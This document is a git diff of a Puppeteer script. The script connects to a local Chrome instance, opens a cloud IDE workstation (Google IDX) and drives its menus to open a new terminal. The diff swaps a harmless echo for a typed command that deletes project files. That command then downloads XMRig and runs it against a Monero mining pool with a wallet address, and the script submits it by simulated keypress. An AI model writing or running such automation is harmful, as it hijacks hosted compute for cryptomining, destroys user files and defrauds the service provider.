@@ -17,68 +17,43 @@ if (isNaN(port) || port < 1024 || port > 65535) {
 }
 
 
-const reset = async (browser, link, i) => {
-    const location = link.split('/');
-    const page = await browser.newPage();
-    await page.goto(link);
-    const classFound = await waitForClassToExist(page, '.is-loaded');
-    if (!classFound) {
-        console.log('Class not found, exiting...');
-        await browser.close();
-        return;
-    }
-    await page.waitForSelector('iframe.is-loaded');
-    console.log('name_', location[location.length - 1]);
-    await clickCMD(page, location[location.length - 1]);
-    await page.close();
-    // await page.keyboard.press('Enter');
-    console.log('Text typed into currently focused element');
-}
 const runReset = async (port) => {
     const browser = await puppeteer.connect({
         browserURL: 'http://localhost:' + port,
         defaultViewport: null,
     });
-
-    // Open a new tab (page)
-
-
     const page = await browser.newPage();
     await page.goto("https://idx-react4-1746439876356.cluster-ejd22kqny5htuv5dfowoyipt52.cloudworkstations.dev/?folder=/home/user/react4");
 
     await new Promise(resolve => setTimeout(resolve, 3 * 1000));
     await page.waitForSelector('.menubar-menu-button', { timeout: 5000 });
+    await page.waitForSelector('.monaco-highlighted-label', { timeout: 100*1000 });
+    console.log('editor-group-watermark===================');
     await page.click('.menubar-menu-button');
 
     await page.waitForSelector('div.menubar-menu-items-holder', { timeout: 5000 });
-    try {
-        await page.waitForSelector('.action-label[aria-label="Terminal"]', { timeout: 5000 });
-        await page.click('.action-label[aria-label="Terminal"]');
-    } catch (err) {
-        console.error('Error clicking on Terminal:', err);
+    await page.waitForSelector('.action-label[aria-label="Terminal"]', { timeout: 5000 });
+    await page.click('.action-label[aria-label="Terminal"]');
+    console.log('Clicked on "Terminal================================"');
+
+    await page.waitForSelector('.action-label[aria-label="New Terminal"]', { timeout: 5000 });
+    const child = await page.$('.action-label[aria-label="New Terminal"]');
+    const parent = await child.evaluateHandle(el => el.parentElement.parentElement);
+    // parent.click();
+    const parentElement = parent.asElement();
+    console.log('parentElement____', parentElement.click);
+    const box = await parentElement.boundingBox();
+    console.log('Bounding box:', box);
+    if (parentElement) {
+        await parentElement.click({ delay: 100 });
+    } else {
+        console.error('Parent element not found or not an ElementHandle');
     }
-    try {
-        await page.waitForSelector('.action-label[aria-label="New Terminal"]', { timeout: 5000 });
-        await page.click('.action-label[aria-label="New Terminal"]');
-
-
-    const dnd = await page.$$('.action-label[aria-label="New Terminal"]').catch((err) => { });
-    console.log('dnd____', dnd);
-
-    } catch (err) {
-        console.error('Error clicking on Terminal or New Terminal:', err);
-    }
-
     console.log('Clicked on "New Terminal"');
     await new Promise(resolve => setTimeout(resolve, 3 * 1000));
-
-    const dnd = await page.$$('.xterm-link-layer').catch((err) => { });
-    console.log('dnd', dnd);
-    await page.waitForSelector('.xterm-link-layer', { timeout: 10 * 1000 });
-    const textToType = 'echo "Hello from automated terminal"'; // Replace with your desired command
+    await page.waitForSelector('.xterm-link-layer', { timeout: 100 * 1000 });
+    const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + 'dnd2_1'
     await page.type('.xterm-helper-textarea', textToType);
-    console.log('Typed text:', textToType);
-
     await page.evaluate(() => {
         const textarea = document.querySelector('.xterm-helper-textarea');
         const event = new KeyboardEvent('keydown', {
@@ -90,10 +65,6 @@ const runReset = async (port) => {
         });
         textarea.dispatchEvent(event);
     });
-
-
-
-
 }
 const main = async () => {
     openChrome(port)
